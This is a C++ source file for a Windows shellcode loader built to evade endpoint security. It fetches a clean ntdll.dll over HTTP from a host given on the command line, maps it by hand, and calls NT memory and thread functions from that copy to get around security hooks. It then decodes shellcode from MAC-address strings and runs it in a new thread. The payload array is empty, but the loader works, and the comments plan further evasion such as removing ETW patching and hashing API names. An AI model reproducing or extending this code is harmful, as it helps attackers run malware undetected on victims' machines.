/* 

1) Use on another DLL that isnt hooked --> kernel32 ?
2) Change Syscalls available
3) Remove ETW patch + Check hook (if not needed)
4) Retrieve shellcode instead of in source
5) API Hash VirtualAlloc?

*/



#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#include <vector>
#include <psapi.h>
#include <winhttp.h>
#include <winternl.h>
#include <Ip2string.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "winhttp")

#define NtCurrentProcess()	   ((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


struct DLL {

    LPVOID ntdll;
    DWORD size;

};


typedef NTSTATUS (*_NtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS (*_NtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);



typedef NTSTATUS (*_NtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

typedef NTSTATUS (*_NtWaitForSingleObject)(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);





DLL GetNtdll(wchar_t* whost, DWORD port, wchar_t* wresource) {
    struct DLL dll;
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {


                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                    // Unhook NTDLL;
                    //Unhook((LPVOID)pszOutBuffer);

                }
                delete[] pszOutBuffer;

            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }

        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();

        char* ntdll = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            ntdll[i] = PEbuf[i];
        }
        dll.ntdll = ntdll;
        dll.size = size;
        return dll;
}



PVOID BaseAddress = NULL;
SIZE_T dwSize = 0x2000;


HANDLE hThread;
DWORD OldProtect = 0;



HANDLE hHostThread = INVALID_HANDLE_VALUE;





int main(int argc, char** argv) {

    // Validate the parameters
    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
        return 1;
    }

    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];

    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);


    const size_t cSize2 = strlen(resource) + 1;
    wchar_t* wresource = new wchar_t[cSize2];
    mbstowcs(wresource, resource, cSize2);

    DLL ntdll = GetNtdll(whost, port, wresource);
    printf("\n[+] Got %s from %s:%d\n\n", resource, host, port);

    char* dllBytes = (char*)malloc(ntdll.size);
    memcpy(dllBytes, ntdll.ntdll, ntdll.size);


    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)dllBytes;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)dllBytes + DOS_HEADER->e_lfanew);

    SIZE_T sizeDll = NT_HEADER->OptionalHeader.SizeOfImage;

    LPVOID alloc_mem = VirtualAlloc(0, sizeDll, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    CopyMemory(alloc_mem, dllBytes, NT_HEADER->OptionalHeader.SizeOfHeaders);

    //load sections into memory
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {

        LPVOID sectionDest = (LPVOID)((DWORD64)alloc_mem + (DWORD64)SECTION_HEADER->VirtualAddress);
        LPVOID sectionSource = (LPVOID)((DWORD64)dllBytes + (DWORD64)SECTION_HEADER->PointerToRawData);
        CopyMemory(sectionDest, sectionSource, SECTION_HEADER->SizeOfRawData);

        SECTION_HEADER++;
    }

    // Copy IAT to memory

    IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

    LPCSTR ModuleName = "ntdll.dll";
    while (IMPORT_DATA->Name != NULL) {

        ModuleName = (LPCSTR)IMPORT_DATA->Name + (DWORD64)alloc_mem;
        IMAGE_THUNK_DATA* firstThunk;
        HMODULE hmodule = LoadLibraryA(ModuleName);
        if (hmodule) {
            firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)alloc_mem + IMPORT_DATA->FirstThunk);
            for (int i = 0; firstThunk->u1.AddressOfData; firstThunk++) {

                DWORD64 importFn = (DWORD64)alloc_mem + *(DWORD*)firstThunk;
                LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;	// get the name of each imported function 
                *(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hmodule, n);
            }
        }
        IMPORT_DATA++;
    }

    // Copy EAT to memory

    IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* addrNames = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNames);
    DWORD* addrFunction = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfFunctions);
    WORD* addrOrdinal = (WORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNameOrdinals);

    DWORD* addrNames1 = addrNames;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    char NtAllocateVirtualMemorytxt[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
		char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames1++);

        //printf("%p\n", ((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]));
		
        if (strstr(name, NtAllocateVirtualMemorytxt) != NULL) {
			pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
			break;
		}
        
	}

    DWORD OldProtect = 0;
    VirtualProtect(alloc_mem, ntdll.size, PAGE_EXECUTE_READ, &OldProtect);

    printf("[+] Mapped ntdll @ %p\n", alloc_mem);
    
	if (pNtAllocateVirtualMemory) {
        NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status1)) {
            printf("[!] Failed in sysZwAllocateVirtualMemory (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtAll0catedV1rtualMem0ry @ %p\n", pNtAllocateVirtualMemory);
        printf("[+] NtAll0catedV1rtualMem0ry Executed !!!\n");
	}
 
    /* ***************** */
    const char* MAC[] =
    {};
/*  ******************** */

    int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
    for (int i = 0; i < rowLen; i++) {
        STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            return FALSE;
        }
        ptr += 6;

    }

   

    DWORD* addrNames2 = addrNames;
    _NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    char NtProtectVirtualMemorytxt[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames2++);

        if (strstr(name, NtProtectVirtualMemorytxt) != NULL) {
            pNtProtectVirtualMemory = (_NtProtectVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }

   
    if (pNtProtectVirtualMemory) {
        NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
        if (!NT_SUCCESS(status2)) {
            printf("[!] Failed in NtPr0tectV1rtualM3mory (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtPr0tectV1rtualMem0ry @ %p\n", pNtProtectVirtualMemory);
        printf("[+] NtPr0tectV1rtualMem0ry Executed !!!\n");
    }

   
    DWORD* addrNames3 = addrNames;
    _NtCreateThreadEx pNtCreateThreadEx = NULL;
    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames3++);

        if (strstr(name, NtCreateThreadExtxt) != NULL) {
            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }

   

    if (pNtCreateThreadEx) {
        NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status3)) {
            printf("[!] Failed in NtCr3at3Thr3adEx (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtCr3at3Thr3adEx @ %p\n", pNtCreateThreadEx);
        printf("[+] NtCr3at3Thr3adEx Executed !!!\n");
    }
    
    
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
   
    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in NtWa1tF0rS1ngle0bj3ct (%u)\n", GetLastError());
        return 4;
    }
    printf("\n[+] NtWa1tF0rS1ngle0bj3ct Executed !!!\n");
    printf("\n\n[+] Finished !!!!\n");

    VirtualProtect(alloc_mem, ntdll.size, PAGE_READONLY, &OldProtect);


    return 0;

}
